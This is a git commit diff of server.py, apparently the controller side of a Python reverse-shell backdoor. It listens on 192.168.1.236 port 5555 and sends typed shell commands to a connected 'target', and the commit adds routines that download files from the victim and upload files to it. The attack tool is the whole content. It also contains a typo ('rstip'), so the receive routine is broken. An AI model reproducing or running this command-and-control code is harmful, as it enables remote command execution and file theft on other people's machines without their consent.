d4144797b7d2a71cc58963586929ce3d2050adee
sk0r <97009398+skor21@users.noreply.github.com>
2023-01-07 01:03:21 +0000

    Updated

--- server.py
+++ server.py
@@ -1,5 +1,6 @@
 import socket
 import json
+import os
 
 def reliable_send(data):
         jsondata = json.dumps(data)
@@ -8,22 +9,46 @@ def reliable_send(data):
 def reliable_recv():
         data = ''
         while True:
-                try:
-                        data = data + target.recv(1024).decode().rstip()
-                        return json.loads(data)
-                except ValueError:
-                        continue
-            
+           try:
+              data = data + target.recv(1024).decode().rstip()
+              return json.loads(data)
+           except ValueError:
+              continue
 
+def upload_file(file_name):
+        f = open(file_name, 'rb')
+        target.send(f.read())
+
+def download_file(file_name):
+   f = open(file_name, 'wb')
+   target.settimeout(1)
+   chunk = target.recv(1024)
+   while chunk:
+      f.write(chunk)
+      try:
+         chunk = target.recv(1024)
+      except socket.timeout as e:
+         break
+   target.settimeout(None)
+   f.close()
+ 
 def target_communication():
-        while True:
-                command = input('* Shell~%s: ' % str(ip))
-                reliable_send(command)
-                if command == 'quit':
-                        break
-                else:
-                        result = reliable_recv()
-                        print(result)
+   while True:
+      command = input('* Shell~%s: ' % str(ip))
+      reliable_send(command)
+      if command == 'quit':
+         break
+      elif command == 'clear':
+         os.system('clear')
+      elif command[:3] == 'cd ':
+         pass
+      elif command[:8] == 'download':
+         download_file(command[9:])
+      elif command[:6] == 'upload':
+                   upload_file(command[7:])
+      else:
+         result = reliable_recv()
+         print(result)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('192.168.1.236', 5555))
